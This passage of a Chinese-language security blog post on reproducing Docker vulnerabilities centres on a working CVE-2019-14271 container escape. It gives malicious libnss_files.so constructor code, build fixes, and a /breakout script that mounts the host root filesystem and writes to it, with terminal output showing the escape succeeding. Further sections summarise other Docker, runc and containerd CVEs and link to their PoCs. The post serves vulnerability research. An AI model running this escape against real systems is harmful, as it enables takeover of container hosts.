class="string">&quot;/original_libnss_files.so.2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIBNSS_PATH <span class="string">&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_priviliged</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) <span class="type">void</span> <span class="title function_">run_at_link</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">char</span> * argv_break[<span class="number">2</span>];</span><br><span class="line">     <span class="keyword">if</span> (!is_priviliged())</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><br><span class="line">     <span class="built_in">fprintf</span>(log_fp, <span class="string">&quot;switched back to the original libnss_file.so&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (!fork())</span><br><span class="line">     &#123;</span><br><span class="line">           <span class="comment">// Child runs breakout</span></span><br><span class="line">           argv_break[<span class="number">0</span>] = strdup(<span class="string">&quot;/breakout&quot;</span>);</span><br><span class="line">           argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">           execve(<span class="string">&quot;/breakout&quot;</span>, argv_break, <span class="literal">NULL</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">           wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child</span></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_priviliged</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">     FILE * proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (proc_file != <span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">           fclose(proc_file);</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// can open so /proc exists, not privileged</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we&#x27;re running in the context of docker-tar</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了保证编译不触发报错，需要注释Makeconfig中的如下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+gccwarn-c = -Wstrict-prototypes -Wold-style-definition</span><br></pre></td></tr></table></figure>
+
+<p>然后进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>编译发生报错，添加头文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时即可正常编译。</p>
+<p><strong>PS：如果不注释Makeconfig的内容的话，就要修改代码：</strong></p>
+<blockquote>
+<p>nss_files&#x2F;files-service.c:41:1: error: function declaration isn’t a prototype [-Werror&#x3D;strict-prototypes]</p>
+<p>41 | bool is_priviliged();</p>
+</blockquote>
+<p>这个是因为没有说明参数是void，改为<code>bool is_priviliged(void);</code></p>
+<p>然而依然报错</p>
+<blockquote>
+<p>nss_files&#x2F;files-service.c:65:6: error: old-style function definition [-Werror&#x3D;old-style-definition]</p>
+<p>65 | bool is_priviliged()</p>
+</blockquote>
+<p>这还是新编译器的更严格的编码规范，所以把65行的参数即使没有传递参数，也需要把void补上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65 | bool is_priviliged(void)</span><br></pre></td></tr></table></figure>
+
+<p>重新make，即可成功。</p>
+<p>将容器中原有的libnss_files.so文件拷贝到容器根目录并重命名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@4508ef5a2633:/lib/x86_64-linux-gnu# cp libnss_files-2.31.so /original_libnss_files.so.2</span><br><span class="line">root@4508ef5a2633:/lib/x86_64-linux-gnu# ls /</span><br><span class="line">bin   breakout  etc   lib    lib64   media  opt  proc  run   srv  tmp  var</span><br><span class="line">boot  dev       home  lib32  libx32  mnt    original_libnss_files.so.2  root  sbin  sys  usr</span><br></pre></td></tr></table></figure>
+
+<p>在lib库build&#x2F;nss目录下可以找到编译好的lib库文件，将lib库文件替换到容器lib库中，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@4508ef5a2633:/lib/x86_64-linux-gnu# ls -l libnss_files*</span><br><span class="line">-rwxr-xr-x 1 root root 422752 Apr 12 02:51 libnss_files.so</span><br><span class="line">lrwxrwxrwx 1 root root     15 Apr 12 02:52 libnss_files.so.2 -&gt; libnss_files.so</span><br></pre></td></tr></table></figure>
+
+<p>在容器根目录新建breakout文件内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">umount /host_fs &amp;&amp; rm -rf /host_fs</span><br><span class="line">mkdir /host_fs</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc     # mount the host&#x27;s procfs over /proc</span><br><span class="line">cd /proc/1/root              # chdir to host&#x27;s root</span><br><span class="line">mount --bind . /host_fs      # mount host root at /host_fs</span><br><span class="line">echo &quot;Hello from within the container!&quot; &gt; /host_fs/evil</span><br></pre></td></tr></table></figure>
+
+<h2 id="触发攻击"><a href="#触发攻击" class="headerlink" title="触发攻击"></a>触发攻击</h2><p>接下来执行docker cp命令，触发攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp ubuntu:/etc/passwd .</span><br></pre></td></tr></table></figure>
+
+<p>执行之后发现容器根目录下的original_libnss_files.so.2文件不见了，说明payload中的rename成功执行了，但是没有成功写文件，需要给breakout添加777权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@4508ef5a2633:/lib/x86_64-linux-gnu# chmod 777 /breakout</span><br></pre></td></tr></table></figure>
+
+<p>将环境重新恢复，然后再次执行docker cp命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cat /evil</span><br><span class="line">cat: /evil: No such file or directory</span><br><span class="line">root@ubuntu:~# docker cp ubuntu:/etc/passwd .</span><br><span class="line">Error response from daemon: error processing tar file: umount: /host_fs: umount failed: No such file or directory.</span><br><span class="line">docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference</span><br><span class="line">: exit status 127</span><br><span class="line">root@ubuntu:~# cat /evil</span><br><span class="line">Hello from within the container!</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC</strong></p>
+<p>NSS参考网址：<a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_node/NSS-Module-Names.html">link</a></p>
+<p>该博客给出了一个恶意so文件</p>
+<p><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p>
+<h1 id="0x04-CVE-2019-13139"><a href="#0x04-CVE-2019-13139" class="headerlink" title="0x04 CVE-2019-13139"></a>0x04 CVE-2019-13139</h1><p><strong>漏洞描述</strong></p>
+<p>在 18.09.4 之前的 Docker 中，能够提供或操纵“docker build”命令的构建路径的攻击者将能够获得命令执行。“docker build”处理远程 git URL 的方式存在问题，并导致命令注入底层“git clone”命令，导致代码在用户执行“docker build”命令的上下文中执行。发生这种情况是因为 git ref 可能被误解为标志。</p>
+<p><strong>POC</strong></p>
+<p>需要研究</p>
+<p><a target="_blank" rel="noopener" href="https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/">https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/</a></p>
+<h1 id="0x05-CVE-2016-9962"><a href="#0x05-CVE-2016-9962" class="headerlink" title="0x05 CVE-2016-9962"></a>0x05 CVE-2016-9962</h1><p><strong>漏洞描述</strong></p>
+<p>RunC 允许通过 ‘runc exec’ 的其他容器进程被容器的 pid 1 跟踪。这允许容器的主进程（如果以 root 身份运行）在初始化期间获得对这些新进程的文件描述符的访问权限，并且可能导致容器逃逸或在进程完全放入容器之前修改 runC 状态。</p>
+<p><strong>原理</strong></p>
+<p>当在已经运行的容器中执行命令时，该漏洞会被利用。当这种情况发生时，容器内的恶意进程可以访问驻留在主机上的目录的“被遗忘的”文件描述符。这反过来又可以用于对主机的文件系统执行目录遍历，从而导致容器逃逸。</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.aquasec.com/cve-2016-9962-run-container-run">https://blog.aquasec.com/cve-2016-9962-run-container-run</a></p>
+<h1 id="0x06-其它未复现CVE"><a href="#0x06-其它未复现CVE" class="headerlink" title="0x06 其它未复现CVE"></a>0x06 其它未复现CVE</h1><p>有些感觉不是很用利用价值，或者是没有找到exp，所以就没有复现。欢迎交流。</p>
+<h2 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h2><p><strong>漏洞简介</strong></p>
+<p>docker越权启动</p>
+<p><strong>漏洞描述</strong></p>
+<p>containerd是一个行业标准的容器运行时，可以作为Linux和Windows的守护进程使用。在版本1.3.9和1.4.3之前的containerd中，containerd-shim API不适当地暴露给主机网络容器。shim的API套接字的访问控制验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。这将允许恶意容器在与shim相同的网络名称空间中运行，其有效UID为0，但其他情况下特权减少，从而导致新进程在特权提高的情况下运行。此漏洞已在容器1.3.9和1.4.3中修复。用户应该在这些版本发布后立即更新。需要注意的是，使用旧版本的containerd-shim启动的容器应该停止并重新启动，因为运行中的容器将继续受到攻击，即使在升级之后。如果你不提供的能力不受信任的用户开始在相同的网络名称空间容器垫片(典型的“主机”网络名称空间,例如码头工人运行——净&#x3D;主机或hostNetwork:真正的Kubernetes pod)和运行的有效UID 0,这个问题你不容易。如果您运行的容器具有易受攻击的配置，您可以通过在策略中添加类似于deny unix addr&#x3D;@**的行来拒绝使用AppArmor访问所有抽象套接字。最佳实践是使用减少的权限集、非零UID和隔离的名称空间运行容器。容器维护者强烈建议不要与主机共享名称空间。无论使用什么容器运行时来运行该容器，减少用于容器的隔离机制集必然会增加该容器的特权。</p>
+<p><strong>版本</strong></p>
+<p>&lt;1.3.9, &lt;1.4.3</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nccgroup/abstractshimmer">https://github.com/nccgroup/abstractshimmer</a></p>
+<p><strong>复现</strong></p>
+<blockquote>
+<p>shim：containerd下的shim是充当containerd和runc之间的中间件，用来组装runc命令的参数，负责容器中进程的启动。</p>
+</blockquote>
+<h2 id="CVE-2021-23732"><a href="#CVE-2021-23732" class="headerlink" title="CVE-2021-23732"></a>CVE-2021-23732</h2><p><strong>描述信息</strong></p>
+<p>如果 Docker.command 方法的命令参数至少可以部分由用户控制，他们将能够在主机系统上执行任意操作系统命令。</p>
+<p><strong>版本</strong></p>
+<p>影响docker-cli-js 的所有版本。</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-DOCKERCLIJS-1568516">https://security.snyk.io/vuln/SNYK-JS-DOCKERCLIJS-1568516</a></p>
+<p><strong>说明</strong></p>
+<p>这是一个docker管理的js库，和docker相关性不高，故略</p>
+<h2 id="CVE-2019-19921"><a href="#CVE-2019-19921" class="headerlink" title="CVE-2019-19921"></a>CVE-2019-19921</h2><p><strong>漏洞描述</strong></p>
+<p>runc 到 1.0.0-rc9 有不正确的访问控制导致权限升级，与 libcontainer&#x2F;rootfs_linux.go 相关。要利用这一点，攻击者必须能够生成两个具有自定义卷挂载配置的容器，并能够运行自定义映像。（由于碰巧阻止了攻击的实现细节，此漏洞不会影响 Docker。）</p>
+<p><strong>版本</strong></p>
+<p>1.0.0-rc9 之前</p>
+<p><strong>POC</strong></p>
+<p>github issue页面，是按照bug提交的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/issues/2197">https://github.com/opencontainers/runc/issues/2197</a></p>
+<h2 id="CVE-2020-10665"><a href="#CVE-2020-10665" class="headerlink" title="CVE-2020-10665"></a>CVE-2020-10665</h2><p><strong>漏洞简介</strong></p>
+<p>docker Desktop Local Privilege Escalation(docker桌面版本地提权)</p>
+<p><strong>漏洞描述</strong></p>
+<p>Docker桌面允许本地权限升级到NT AUTHORITY\SYSTEM，因为它错误地处理了管理员权限的诊断集合，导致任意DACL权限覆盖和任意文件写入。</p>
+<p><strong>版本信息</strong></p>
+<p>Docker Desktop for Windows Stable在2.2.0.4之前</p>
+<p>Docker Desktop for Windows Edge在2.2.2.0之前</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spaceraccoon/CVE-2020-10665">https://github.com/spaceraccoon/CVE-2020-10665</a></p>
+<h2 id="CVE-2020-11492"><a href="#CVE-2020-11492" class="headerlink" title="CVE-2020-11492"></a>CVE-2020-11492</h2><p><strong>漏洞简介</strong></p>
+<p>docker Desktop越权</p>
+<p><strong>漏洞描述</strong></p>
+<p>在Windows上通过2.2.0.5发现Docker Desktop有问题。如果本地攻击者在启动同名Docker之前设置了自己的命名管道，该攻击者可以拦截来自Docker Service(以SYSTEM的形式运行)的连接尝试，然后模拟他们的权限。</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/joshfinley/CVE-2020-11492">https://github.com/joshfinley/CVE-2020-11492</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CrackerCat/CVE-2020-11492">https://github.com/CrackerCat/CVE-2020-11492</a></p>
+<h1 id="0x07-Docker提权"><a href="#0x07-Docker提权" class="headerlink" title="0x07 Docker提权"></a>0x07 Docker提权</h1><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/evict/poc_CVE-2018-1002105">https://github.com/evict/poc_CVE-2018-1002105</a>)</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/05/02/docker-cve/">http://example.com/2022/05/02/docker-cve/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/docker/"># docker</a>
+                    
+                        <a href="/tags/cve/"># cve</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/06/20/ruoyi/">若依项目部分漏洞代码分析</a>
+            
+            
+            <a class="next" rel="next" href="/2022/04/20/CVE-2022-22947/">CVE-2022-22947分析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
